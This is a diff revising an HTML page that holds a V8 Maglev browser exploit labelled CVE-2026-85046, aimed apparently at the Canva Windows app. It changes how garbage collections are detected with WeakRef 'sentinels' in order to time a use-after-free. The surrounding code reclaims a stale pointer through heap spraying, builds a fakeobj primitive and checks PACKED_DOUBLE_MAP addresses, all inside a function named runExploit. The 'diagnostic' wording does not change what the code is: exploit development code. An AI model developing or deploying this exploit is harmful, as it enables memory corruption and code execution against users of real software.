@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
   <head>
-    <title>CVE-2026-85046 - Canva Windows GC-sentinel reclaim diagnostic v16</title>
+    <title>CVE-2026-85046 - Canva Windows collection-sentinel reclaim diagnostic v17</title>
     <meta charset="UTF-8" />
     <style>
       * {
@@ -178,7 +178,7 @@
       var running = false;
 
       try {
-        var previousDiagnostic = localStorage.getItem("f022-v16-last");
+        var previousDiagnostic = localStorage.getItem("f022-v17-last");
         if (previousDiagnostic) {
           setTimeout(function () {
             log("[previous diagnostic] " + previousDiagnostic);
@@ -313,20 +313,36 @@
       }
 
       async function waitUntilWeakCleared(weak, maxBatches) {
-        // WeakRef targets are guaranteed to stay alive until the end of the
-        // current JavaScript job. Yield once before testing collection.
+        // IMPORTANT WeakRef rule:
+        // A successful deref() keeps the target alive until the END OF THE
+        // CURRENT JS JOB. Therefore allocation pressure must never run in the
+        // same job after a successful deref().
+        //
+        // Layout per iteration:
+        //   job A: neutral allocations
+        //   yield
+        //   job B: deref/check only
+        //   yield  <-- releases the keep-alive created by deref()
+        //   job C: next neutral allocation batch
+        //
+        // This does not prove which GC kind ran; it only tells us that this
+        // particular weak target has actually been cleared by V8.
         await nextTask();
 
         for (var i = 1; i <= maxBatches; i++) {
+          // Fresh job with no WeakRef keep-alive from this iteration.
           neutralPressureBatch();
+
+          // End the allocation job before observing the weak target.
           await nextTask();
 
           if (weak.deref() === undefined) {
             return i;
           }
 
-          // deref() keeps the target alive until this job ends, so the next
-          // iteration always starts in a fresh task.
+          // deref() succeeded and now pins the target through the current job.
+          // End this job BEFORE doing more allocation pressure.
+          await nextTask();
         }
 
         return -1;
@@ -431,7 +447,7 @@
 
         try {
           localStorage.setItem(
-            "f022-v16-last",
+            "f022-v17-last",
             JSON.stringify({
               dead_addr: hex(dead_addr),
               victim: hex(victim_base),
@@ -454,33 +470,34 @@
             hex(victim_base),
         );
 
-        // GC #1: wait until the original young object is truly gone.
-        dbg("      [6.1] waiting for GC #1 (young target must die)...");
+        // Collection sentinel A: wait until the original weak-tracked target is actually cleared.
+        dbg("      [6.1] waiting for collection sentinel A to clear...");
         var gc1Batches = await waitUntilWeakCleared(weakYoung, 96);
         weakYoung = null;
 
         if (gc1Batches < 0) {
-          throw new Error("GC #1 was not observed within 96 neutral batches");
+          throw new Error("sentinel A was not cleared within 96 neutral batches");
         }
 
-        dbg("      [6.1] GC #1 observed after " + gc1Batches + " neutral batches");
+        dbg("      [6.1] sentinel A cleared after " + gc1Batches + " neutral batches");
 
-        // GC #2: create a fresh weak sentinel in the current active semispace.
-        // When it dies, another collection has occurred and the stale target's
-        // old semispace has become active/allocatable again.
+        // Collection sentinel B: create a fresh weak target after A has cleared.
+        // If it clears under the same young-allocation pressure, we have observed
+        // a second collection event. This is useful telemetry but not a spec-level
+        // guarantee that it was exactly the second Scavenge/semispace flip.
         var flipSentinel = { phase: 2 };
         var weakFlip = new WeakRef(flipSentinel);
         flipSentinel = null;
 
-        dbg("      [6.2] waiting for GC #2 (semispace flip)...");
+        dbg("      [6.2] waiting for collection sentinel B to clear...");
         var gc2Batches = await waitUntilWeakCleared(weakFlip, 96);
         weakFlip = null;
 
         if (gc2Batches < 0) {
-          throw new Error("GC #2 was not observed within 96 neutral batches");
+          throw new Error("sentinel B was not cleared within 96 neutral batches");
         }
 
-        dbg("      [6.2] GC #2 observed after " + gc2Batches + " neutral batches");
+        dbg("      [6.2] sentinel B cleared after " + gc2Batches + " neutral batches");
 
         // Final reclaim fill. No yield/log/allocation between this spray and
         // dereferencing the stale pointer.
@@ -489,14 +506,14 @@
 
         try {
           localStorage.setItem(
-            "f022-v16-last",
+            "f022-v17-last",
             JSON.stringify({
               dead_addr: hex(dead_addr),
               victim: hex(victim_base),
               originalPattern: original_pattern,
               selectedPattern: pattern,
-              gc1Batches: gc1Batches,
-              gc2Batches: gc2Batches,
+              sentinelABatches: gc1Batches,
+              sentinelBBatches: gc2Batches,
               finalBatches: finalBatches,
               expectedLength: 32,
               expectedPackedDoubleMap: hex(PACKED_DOUBLE_MAP),
@@ -589,7 +606,7 @@
       // Main
       // ---------------------------------------------------------------------------
       async function runExploit() {
-        log("=== CVE-2026-85046 — V8 Maglev GC-sentinel reclaim diagnostic ===");
+        log("=== CVE-2026-85046 — V8 Maglev collection-sentinel reclaim diagnostic ===");
         log("");
 
         var ua = navigator.userAgent;
@@ -639,12 +656,12 @@
         );
 
         log("");
-        log("[*] Step 3: GC-sentinel fakeobj reclaim...");
+        log("[*] Step 3: collection-sentinel fakeobj reclaim...");
 
         var result = await attempt_fakeobj_gc_sentinel();
 
-        log("      GC #1 batches: " + result.gc1Batches);
-        log("      GC #2 batches: " + result.gc2Batches);
+        log("      sentinel A batches: " + result.gc1Batches);
+        log("      sentinel B batches: " + result.gc2Batches);
         log("      typeof bad[2]: " + result.masterType);
         log("      observed master.length: " + result.length);
 
@@ -658,8 +675,8 @@
           deadAddr: hex(result.dead_addr),
           victim: hex(result.victim_base),
           selectedPattern: result.pattern,
-          gc1Batches: result.gc1Batches,
-          gc2Batches: result.gc2Batches,
+          sentinelABatches: result.gc1Batches,
+          sentinelBBatches: result.gc2Batches,
           masterType: result.masterType,
           observedLength: result.length,
           expectedLength: 32,
